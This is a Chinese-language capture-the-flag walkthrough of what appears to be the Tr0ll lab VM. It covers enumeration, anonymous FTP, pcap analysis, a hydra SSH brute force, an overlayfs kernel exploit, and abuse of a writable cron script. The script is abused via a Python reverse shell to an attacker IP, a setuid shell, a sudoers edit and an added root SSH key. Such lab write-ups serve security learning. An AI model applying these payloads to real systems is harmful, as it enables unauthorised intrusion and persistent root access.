1、nmap枚举
nmap -sP 10.211.55.0/24
nmap 10.211.55.32
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

nmap 10.211.55.32 -p- -sS -sV -A
1）ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap 

2）22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
3）80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret

发现ftp存在lol.pcap流量文件，还有FTP带有匿名登录名：Anonymous FTP login allowed，80http存在robots.txt和/secret目录文件。

2、登录FTP枚举
账号密码：
Anonymous
Anonymous

ftp 10.211.55.32
dir
get lol.pcap

3、wireshark分析流量
wireshark lol.pcap

wireshark对流量界面右键->追踪流量->TCP流量！
获得tcp.stream eq 1和tcp.stream eq 2等信息：
tcp.stream eq 1：第一个流显示了一个文件secret_stuff.txt
tcp.stream eq 2：sup3rs3cr3tdirlol
------
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
------

4、页面枚举http://10.211.55.32/sup3rs3cr3tdirlol/
roflmao下载！
file roflmao    ---枚举是32位的ELF 二进制文件

strings roflmao 发现Find address 0x0856BF to proceed
hexeditor roflmao  ---十六进制的也可以用这个发现！

5、页面枚举http://10.211.55.32/0x0856BF/
存在两页页面：good_luck/   this_folder_contains_the_password/	

http://10.211.55.32/0x0856BF/good_luck/which_one_lol.txt
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow

http://10.211.55.32/0x0856BF/this_folder_contains_the_password/Pass.txt：
Good_job_:)
初步猜测是用户密码hydra爆破！

6、hydra爆破
hydra -L user.txt -p Pass.txt 10.211.55.32 ssh
[22][ssh] host: 10.211.55.32   login: overflow   password: Pass.txt

7、登录系统ssh
ssh overflow@10.211.55.32
$ uname -a
Linux 4-Tr0ll 3.13.0

searchsploit Linux 4-Tr0ll 3.13.0：只有两个符合的
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                        | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                   | linux/local/37293.txt

利用37292.c：
cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面
python -c 'import pty; pty.spawn("/bin/bash")'
python -m SimpleHTTPServer 80
wget http://10.211.55.19:8081/37292.c
gcc 37292.c -o dayu1
./dayu1
# cat proof.txt
Good job, you did it! 
702a8c18d29c6f3ca0d99ef5712bfbdc

----------------------
拓展思路：
Broadcast Message from root@4-Tr                                               
        (somewhere) at 8:40 ...                                                
                                                                               
TIMES UP LOL!                                                                  
                                                                               
Connection to 10.211.55.32 closed by remote host.
Connection to 10.211.55.32 closed.
----
它会自动结束ssh进程，而且还是整点提示！说明有计划任务在自动到点结束进程。每5分钟就被踢一次！
find / -name cronlog 2>/dev/null    ---查看计划任务日志信息
find / -name cleaner.py 2>/dev/null   ---查看文件在哪儿
find / -writable 2>/dev/null   ---枚举所有可写入权限的文件
find / -perm -o+w -type f 2> /dev/null | grep /proc -v   ---枚举
/lib/log/cleaner.py


知道了计划任务和py脚本可写入，以及py的位置后，那么方法千万种，接下来演示三种：
1）反弹shell
2）创建root可执行程序，获得root权限
3）写入ssh rsa，ssh登录root用户

nano使用教程：
ctrl x | y
---------
1）反弹shell
nc -tvlp 9999

#!/usr/bin/python
def con():
	import socket, time,pty, os
	host='10.211.55.19'
	port=9999
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

----------
2）创建root可执行程序，获得root权限

os.system('cp /bin/sh /tmp/dayu1')
os.system('chmod u+s /tmp/dayu1')

或者编辑脚本以将用户溢出添加到sudoers文件中可以sudo su到root用户：
os.system('echo "overflow ALL=(ALL) ALL" >> /etc/sudoers')

cd /tmp
ls
./sh
cd /root
ls
cat proof.txt
-----
3）写入ssh rsa，ssh登录root用户
ssh-keygen   ---都空格回车
cd ~/.ssh
cat id_rsa.pub
mkdir /root/.ssh; chmod 775 .ssh; echo "加上 id_rsa.pub产生的密匙内容上图有例子" >> /root/.ssh/authorized_keys


--------















